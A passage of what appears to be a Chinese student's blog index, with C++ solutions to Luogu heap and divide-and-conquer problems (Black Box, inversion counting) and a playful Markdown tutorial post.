maxChild; if(rChild &gt; length) maxChild = lChild; else if(maxHeap[lChild].prior == maxHeap[rChild].prior) { if(maxHeap[lChild].stTime &lt;= maxHeap[rChild].stTime) maxChild = lChild; else maxChild = rChild; } else maxChild = maxHeap[lChild].prior &gt; maxHeap[rChild].prior ? lChild : rChild; if(maxHeap[maxChild].prior == maxHeap[position].prior) { if(maxHeap[maxChild].stTime &lt;= maxHeap[position].stTime) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } else if(maxHeap[maxChild].prior &gt; maxHeap[position].prior) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } } void HeapifyFromDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent].prior == maxHeap[position].prior) { if(maxHeap[parent].stTime &gt;= maxHeap[position].stTime) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } else if(maxHeap[parent].prior &lt; maxHeap[position].prior) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } } void PushMaxHeap() { SwapHeap(1, length); length--; HeapifyFromUpToDown(1); } void PutMaxHeap(int prior, int num, int stTime, int lastTime) { length++; maxHeap[length].prior = prior; maxHeap[length].num = num; maxHeap[length].stTime = stTime; maxHeap[length].lastTime = lastTime; HeapifyFromDownToUp(length); } int main() { int prior, num, stTime, durTime, timePass; int lastPrior, lastNum, lastStTime, lastDurTime; while(cin&gt;&gt;num&gt;&gt;stTime&gt;&gt;durTime&gt;&gt;prior) { if(length != 0) { timePass = stTime - lastStTime; while( length != 0 &amp;&amp; timePass &gt;= maxHeap[1].lastTime ) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; timePass = timePass - maxHeap[1].lastTime; cout&lt;&lt;stTime - timePass&lt;&lt;endl; PushMaxHeap(); } if(length != 0) maxHeap[1].lastTime = maxHeap[1].lastTime - timePass; } PutMaxHeap(prior, num, stTime, durTime); lastNum = num; lastPrior = prior; lastStTime = stTime; lastDurTime = durTime; } int time = lastStTime; if(length != 0) { while(length != 0) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; cout&lt;&lt;time + maxHeap[1].lastTime&lt;&lt;endl; time = time + maxHeap[1].lastTime; PushMaxHeap(); } } return 0; } 复杂度分析全是条件句分析好难啊 我还是根据结果论分析吧 时间就约等于1s吧，数据量应该是满的，15000 查一下表得知，是O(nlgn) 下表记住廖： 复杂度 下限 上限 O(logN) 10^20 很大 O(N^1/2) 10^12 10^14 O(N) 10^6 10^7 O(NlogN) 10^5 10^6 O(N^2) 1000 2500 O(N^3) 100 500 O(N^4) 50 50 O(2^N) 20 20 O(N!) 9 10","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"模拟","slug":"模拟","permalink":"https://v25bh145.github.io/tags/%E6%A8%A1%E6%8B%9F/"}]},{"title":"Question-P1801","date":"2019-11-30T10:25:11.000Z","path":"2019/11/30/coding/questions/Question-P1801/","text":"P1801题目描述Black Box是一种原始的数据库。它可以储存一个整数数组，还有一个特别的变量i。最开始的时候Black Box是空的．而i等于0。这个Black Box要处理一串命令。 命令只有两种： ADD(x):把x元素放进BlackBox; GET:i加1，然后输出Blackhox中第i小的数。 记住：第i小的数，就是Black Box里的数的按从小到大的顺序排序后的第i个元素。例如： 我们来演示一下一个有11个命令的命令串。（如下图所示） 现在要求找出对于给定的命令串的最好的处理方法。ADD和GET命令分别最多200000个。现在用两个整数数组来表示命令串： 1.A(1)，A(2)，…A(M)：一串将要被放进Black Box的元素。每个数都是绝对值不超过2000000000的整数，M$200000。例如上面的例子就是A=(3，1，一4，2，8，-1000，2)。 2.u(1)，u(2)，…u(N)：表示第u(j)个元素被放进了Black Box里后就出现一个GET命令。例如上面的例子中u=(l，2，6，6)。输入数据不用判错。 输入格式第一行，两个整数，M，N。 第二行，M个整数，表示A(l) ……A(M)。 第三行，N个整数，表示u(l) …u(N)。 输出格式输出Black Box根据命令串所得出的输出串，一个数字一行。 输入输出样例输入 #1 7 4 3 1 -4 2 8 -1000 2 1 2 6 6 输出 #1 3 3 1 2 说明/提示对于30%的数据，M≤10000; 对于50%的数据，M≤100000： 对于100%的数据，M≤200000。 听音乐 解康康这道题辣，给出了m的数据范围在200000之内分析下时间复杂度应该是要求 O(mlgm) 题目的意思大概就是 需要给出在加入第i个元素的排序序列时需要序列第j个小的值 j是自增的 而i是任意给定的自增数列 (题目没说我差点就想再来个排序了) 然后题把加入和查询单独两列列开了，用最简单的模拟显然是不阔以加入一个检测一个的 所以先把add和get操作存进数组里，后续再一并处理： for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; } 之后的处理也大概能写个框架出来 headGet = 1; for(int i = 1;i &lt;= m; i++) { //Mark.1 //对putOp[i]进行处理 while(getOp[headGet] == i) { //Mark.2 //对getOp[headGet]进行处理 cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } 这里需要注意一下while,题目实例就给出了get重复的i值 我才不是因为一开始写的if等到写完了算法回去再测试的时候菜发现的呢 (菜) 好了，那我们来填补一下里面的操作扒 Mark.1:这里如果想要实现的话，最暴力的操作就是插入排序，把putOp[i]插入到数组中 同时使得数组的升序不变性保持不变 时间复杂度：theta($m^{2}$) 明显超了 嗯就先这么来吧，暴力解get Mark.2:如果按照上文的插入排序，这里就十分简单辣 直接返回a[i]就可以辣 来康暴力代码：仅仅展示了一些暴力插入排序 为了博客效果写了份暴力代码还不快夸我 void InsertArray(int k) { length++; array[length] = k; if(length != 1) { for(int i = length - 1; i &gt;= 1; i--) { if(array[i + 1] &lt; array[i]) swap(array[i + 1], array[i]); else break; } } } int main() { for(int i = 1;i &lt;= m; i++) { InsertArray(putOp[i]); while(getOp[headGet] == i) { tmp = array[headGet]; cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; } 果然暴力插♂入只有30分嘛~ 好的继续，现在我们需要优化程序廖 插入排序的优化Mark.1这里的插入消耗时间显然过长，一定需要在这里优化 来一波分析，如果需要theta(mlgm) 外部的循环已经配了一层m了，所以里面的要求只能是最多lgm 然后需要的是第i大的数…第i大…第 很容易想到堆的性质鸭！！ 所以我们先建一个最小堆 这样在这里的操作复杂度就是O(lgm)廖 接下来甩锅给Mark.2同学 Mark.2这里需要获取第headGet小的值 能做的就是类似堆排序一样的东东，不断从堆顶拔头发取数字，然后交换最后一个让最后一个顺下去，取headGet遍 恭喜我得出来这个玩意儿：O($m^{2}$lgm) 怎么来的？考虑最坏情况为在put(m)处连续get(m)次，也就是堆排序辣 这个算法使得Mark.2更暴力辣，Mark.2号同学肯定不服气了，把锅儿一巴掌呼回了Nark.1 堆的优化需要优化Mark.2，这时我们把眼光看向瑟瑟发抖的Mark.1 我们可以在Mark.1上加入一些时间来简化Mark.2的时间 怎么做呢？ 好戏来了这里考虑到Mark.2在获取第headGet大的数据时多执行了headGet - 1次 有什么办法直接获取到第headGet大的数字呢？ 我们可以让第headGet大的数字直接位于堆首，把比headGet小的数字扔进弃牌区里 在Mark.2读取完第headGet大的数据后，headGet++，然后把第headGet大的数据也扔进弃牌区里 这时回到Mark.1，我们在加入数据的时候需要在先跟弃牌区里的数字比较一下，然后挑出最大的放到最小堆里 诶，这里这个弃牌区怎么实现呢？ 首先考虑到弃牌区必须要有序 元素依次加入的同时维护有序性 所以我们自然想到了我们的老朋友—插入排序！ 别急，还没完！ 然后再次考虑到我们需要获取最大的元素 再想想刚刚的暴力插入排序转变的过程 终于发现了嘛？ 其实可以将弃牌区用最大堆实现！ 所以总体，复述一下操作： 执行putOp时 将其放入最大堆，维护最大堆性质 从最大堆挑出最大的元素，维护最大堆性质 将挑出的元素放入最小堆，维护最小堆性质 执行getOp时 从最小堆挑出最小的元素，维护最小堆性质 输出它 将挑出的元素放入最大堆，维护最大堆性质 最终的双堆数据结构代码：从输入到处理到输出都写上了 堆的维护好好康康鸭，两种维护方式(自顶向下，自叶向上)都要用上 #include &lt;iostream&gt; #define MAXSIZE 200500 using namespace std; int n,m; int maxLength = 0, minLength = 0; int minHeap[MAXSIZE], maxHeap[MAXSIZE],getOp[MAXSIZE],putOp[MAXSIZE]; void MinHeapifyUpToDown(int k) //up to down { if(k &lt;= minLength / 2) { int lChild = k * 2; int rChild = k * 2 + 1; int minChild; if(rChild &gt; minLength) minChild = lChild; else minChild = minHeap[lChild] &lt; minHeap[rChild] ? lChild : rChild; if(minHeap[k] &gt; minHeap[minChild]) { swap(minHeap[k], minHeap[minChild]); MinHeapifyUpToDown(minChild); } } } void MinHeapifyDownToUp(int k) //down to up { if(k / 2 &gt; 0) { int parent = k / 2; if(minHeap[parent] &gt; minHeap[k]) { swap(minHeap[parent], minHeap[k]); MinHeapifyDownToUp(parent); } } } void PutMinHeap(int k) { minLength++; minHeap[minLength] = k; MinHeapifyDownToUp(minLength); } int GetMinHeap() { int result = minHeap[1]; swap(minHeap[1], minHeap[minLength]); minLength--; MinHeapifyUpToDown(1); return result; } void MaxHeapifyDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent] &lt; maxHeap[position]) { swap(maxHeap[parent], maxHeap[position]); MaxHeapifyDownToUp(parent); } } } void MaxHeapifyUpToDown(int position) { if(position &lt;= maxLength / 2) { int maxChild; int lChild = position * 2; int rChild = position * 2 + 1; if(rChild &gt; maxLength) maxChild = lChild; else maxChild = maxHeap[lChild] &gt; maxHeap[rChild] ? lChild : rChild; if(maxHeap[position] &lt; maxHeap[maxChild]) { swap(maxHeap[position], maxHeap[maxChild]); MaxHeapifyUpToDown(maxChild); } } } void PutMaxHeap(int k) { maxLength++; maxHeap[maxLength] = k; MaxHeapifyDownToUp(maxLength); } int GetMaxHeap() { int result = maxHeap[1]; swap(maxHeap[1], maxHeap[maxLength]); maxLength--; MaxHeapifyUpToDown(1); return result; } int main() { cin&gt;&gt;m&gt;&gt;n; int tmp,headGet; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; } headGet = 1; for(int i = 1;i &lt;= m; i++) { PutMaxHeap(putOp[i]); tmp = GetMaxHeap(); PutMinHeap(tmp); while(getOp[headGet] == i) { tmp = GetMinHeap(); PutMaxHeap(tmp); cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; } 感想：这道题我居然一次做出来了诶，果然堆对我的毒害不浅哈哈哈哈 所以大概什么时候使用堆呢？ 插入排序的优化 “最”出现的时候 优先队列(早日遇上过来水水写写)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P1908","date":"2019-11-26T10:36:39.000Z","path":"2019/11/26/coding/questions/Question-P1908/","text":"P1908题目描述猫猫TOM和小老鼠JERRY最近又较量上了，但是毕竟都是成年人，他们已经不喜欢再玩那种你追我赶的游戏，现在他们喜欢玩统计。最近，TOM老猫查阅到一个人类称之为“逆序对”的东西，这东西是这样定义的：对于给定的一段正整数序列，逆序对就是序列中ai&gt;aj且i&lt;j的有序对。知道这概念后，他们就比赛谁先算出给定的一段正整数序列中逆序对的数目。 Update:数据已加强。 输入格式第一行，一个数n，表示序列中有n个数。 第二行n个数，表示给定的序列。序列中每个数字不超过10^9109 输出格式给定序列中逆序对的数目。 输入输出样例输入 #1 6 5 4 2 6 3 1 输出 11 说明/提示对于25%的数据，n \\leq 2500n≤2500 对于50%的数据，n \\leq 4 \\times 10^4n≤4×104 。 对于所有数据，n \\leq 5 \\times 10^5n≤5×105 请使用较快的输入输出 题外话听音乐~ 啊对了，忘了说廖，建立这个博客就是为了记录学编程的过程呢 大概是初二(初三？？ 反正我也不知道我跳的是初二还是初三hhh)开始学的C扒 然后高一试着搞了搞noip，高二喜提省二第一就放弃廖TAT 菜是原罪啊 现在大一廖，也不知道怎么脑子抽了报志愿就报了计算机专业hhh 终于决定痛改前非，去搞一搞ACM 总之就是你们面前这个写博客的蒟蒻又双叒叕开始学编程了QAQ 应该在博客里打算记一下这些东西： 算法题中过程出大问题的地方 Question 应该会按照算法分好类 一些奇♂妙的编程方法 Algorithm 一些编程科目的小笔记 Note 应该不多这个 嘛应该会记得很杂很杂…..尽量分个小类吧hhh 不啰嗦了hh 解嘛首先看到这道题，分析一波数据要求theta(nlgn) 然后首先考虑遍历数组，发现暴力做法就是遍历两遍数组： 暴力解法 for(int i = 1; i &lt;= n; i++) for(int j = i + 1; j &lt;= n; j++&gt;) if(a[i] &gt; a[j]) count++; 嗯就是这么暴力,自己求一遍逆，用计算机打出我的暴力思路hhh 然后发现题目标签有分治法，这道题可以用分治法来做 先拆分，一般都拆成二分一列数组的逆序数 = 中间靠左数组的逆序数 + 中间靠右数组的逆序数 + 两个子数组之间产生的逆序数 然后递归求解两边的逆序数，发现：原子问题： 两个数字的逆序数 最后要合并问题 这里我为难廖，怎么合并呢？也就是说，怎么求两个子数组之间产生的逆序数呢？ 先考虑暴力做法，跟上方的代码差不多，左边遍历一遍，然后嵌套里面，里面右边遍历一遍 有什么优化嘛？什么被重复计算了？ 我发现了：_假设5&gt;2，5在2前面，如果有7&gt;5，7在2的前面，那么一定有7&gt;2_ 这里自然而然想到了排序，也就假设左右合并的数组已经排好序(升序)了 发现只用遍历一遍就能出结果 计数好右边的数字的数目 遍历整个排好升序的数组 如果遍历到右边的数字，计数— 如果遍历到左边的数字，结果 += 计数 如此得合并的时间复杂度为 排序的复杂度+一个单n 分治法1这里搞了一个结构体，用来暂存传入Merge()中的数组以及下标，并且排好序 //分治法的合并 int Merge(int l, int r) { for(int i = l; i &lt;= r; i++) { snot2[i].num = snot[i]; snot2[i].p = i; } VQuickSort(l, r); int count = 0, result = 0; for(int i = l; i &lt;= r; i++) { if(snot2[i].p &gt; ( l + r ) / 2) count++; if(snot2[i].p &lt;= ( l + r ) / 2) result += count; snot2[i].num = 0; snot2[i].p = 0; } return result; } //分治法的拆分和递归 int Rev(int l, int r) { if(l + 1 == r) { if(snot[l] &gt;= snot[r]) return 1; else return 0; } else if (l &lt; r) { int mid = ( l + r ) / 2; int leftValue = Rev(l, mid); int rightValue = Rev(mid + 1, r); int midValue = Merge(l, r); return leftValue + rightValue + midValue; } else return 0; } 正确性：由循环不变式确定，正确 时间复杂度( T(1) = theta(1) )： T(n) = 2T(n / 2) + nlgn = theta(nlg(n)lg(n)) 嗯还是超了，事实证明只过了前50% 很明显问题出在Merge()上，每次都排一次序很麻烦 然后 这 个 时 候 我终于意识到了 这玩意跟归并排序好像啊！ 归并排序也有排序啊，也有分治啊 归并排序的Merge()部分，数组是由Partition部分排过序的 那么这个题也在Partition部分排个序也就行廖 分治法2其实这个题就是分治法加上一个返回值啊…… long long int Merge(int left, int right) { int mid = (left + right) / 2; int leftLength = right - mid; long long int result = 0; int k,p; k = mid; p = right; for(int i = 1; i &lt;= right - left + 1; i++) { if(k &lt; left) { mia[i] = snot[p]; p--; leftLength--; } else if(p &lt; mid + 1) { mia[i] = snot[k]; k--; } else if(snot[k] &lt;= snot[p]) { mia[i] = snot[p]; p--; leftLength--; } else if(snot[k] &gt; snot[p]) { mia[i] = snot[k]; k--; result += leftLength; } } for(int i = right - left + 1; i &gt;= 1; i--) { snot[left + right - left + 1 - i] = mia[i]; mia[i] = 0; } return result; } long long int Rev(int left, int right) { if(left &lt; right) { if(left + 1 == right) { if(snot[left] &gt; snot[right]) { swap(snot[left], snot[right]); return 1; } else return 0; } int mid = (left + right) / 2; long long int leftValue = Rev(left, mid); long long int rightValue = Rev(mid + 1, right); long long int midValue = Merge(left, right); return leftValue + rightValue + midValue; } return 0; } 嗯，AC了，是我愚钝，把这道普及+的题看♂了QAQ 以后分治的时候可别再犯这种 过程重复计算使时间空间复杂度提高 的蠢错误了啊QAQ 欧系卖To be continued","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"分治法","slug":"分治法","permalink":"https://v25bh145.github.io/tags/%E5%88%86%E6%B2%BB%E6%B3%95/"}]},{"title":"我的第一个博客","date":"2019-11-26T09:28:19.000Z","path":"2019/11/26/我的第一个博客/","text":"首先，不管你是谁，总之欢迎来到我的博客鸭~ 听音乐~ 第一个博客文章，我就记一下.md的相关知识扒 学自菜鸟教程 https://www.runoob.com/markdown/md-tutorial.html 一. 标题标题一共六种鸭，一级到六级 一级标题二级标题三级标题四级标题五级标题六级标题# 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题 一级标题 ------- 二级标题 ======= 二. 段落的格式关于换行的话，有两种方式： 在一行尾部空出两个以上空格 多空一行 这两种方式有差别的亚子 段落的字体可以自己设置鸭 有这些： 星号星号可以插入在文本之间呢斜体字~粗♂体字粗♂斜♂体 *斜体字~* **粗♂体字** ***粗♂斜♂体*** 下划线下划线只能在段首段位使用的_斜体字~_粗♂体字 _斜体字~_ __粗♂体字__ 分割线↓这个就是个分割线辣~~↓ *** * * * ***** - - - ------- 删除线删除线~一一一(调皮) ~~删除线~~ 下划线这个 &lt;u&gt;下划线&lt;/u&gt; 脚注 脚注貌似无法使用emmmmm 三. 列表有序的和无序的： 第一项 第二项 第三项 * 第一项 * 第二项 * 第三项 + 第一项 + 第二项 + 第三项 - 第一项 - 第二项 - 第三项 qaq qaq qaq 1. qaq 2. qaq 3. qaq 然后还能嵌套,像酱紫 qaq qaq qaq qaq qaq qaq qaq qaq qaq qaq (混乱) 四. 区块区块引用就是加上一个&gt;符号和一个空格 我是一个区块引用 巧了，我也是诶 我不仅有一级引用 我还有二级引用 甚至还有三级 甚至还能做列表 还能嵌套 列表 区块引用 我是一个区块引用 巧了，我也是诶 我不仅有一级引用 我还有二级引用 甚至还有三级 甚至还能做列表 还能嵌套 列表 区块引用 五. 代码scanf()函数~printf()函数~static void main(String[] args) `scanf()`函数~ `printf()`函数~ `static void main(String[] args` 空四格或者一个Tab就是代码区块辣 ----&gt;像这样(这怎么描述啊喂) 六. 链接比如酱紫: 滚去问度娘啊！ 滚去问[度娘](http://www.baidu.com/)啊！ https://v25bh145.github.io/ &lt;https://v25bh145.github.io/&gt; 还有高级(搞♂基)的链接 变量式的： 滚去问度娘啊啊啊 baidu滚去问[我的主页]啊啊啊 主页 七. 图片 ![alt 属性文本](图片地址) ![alt 属性文本](图片地址 &quot;可选标题&quot;) alt 属性文本 :就是图片的替代文字 可选标题 :title属性的文字 我这里用了这个上传图片网站哇 ![example.png](https://i.loli.net/2019/11/26/eSxz8W2A6rFpMyK.png) 当然是可以使用变量的啦 [example][1] [1]: &quot;链接&quot; 八. 表格 表头 &lt;-学姐头没了(滑稽) 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 |表头||&lt;-学姐头没了(滑稽)| | ---- | ---- | ---- | | 单元格儿 | 单元格儿 | 单元格儿 | | 单元格儿 | 单元格儿 | 单元格儿 | 表头底下的横线还可以设置表格格式： :—— 居左对齐 ——: 居右对齐 :——: 居中对齐 ⑨. 另外一些gao♂ji特性一些高级技巧： 支持HTML元素也就是说可以不用学markdown直接开学html哈哈哈 *转义* \\*转义\\* 内嵌数学公式以开始，\\结束,格式为TeX或者LaTeX","tags":[{"name":"markdown","slug":"markdown","permalink":"https://v25bh145.github.io/tags/markdown/"},{"name":"随笔","slug":"随笔","permalink":"https://v25bh145.github.io/tags/%E9%9A%8F%E7%AC%94/"}]}]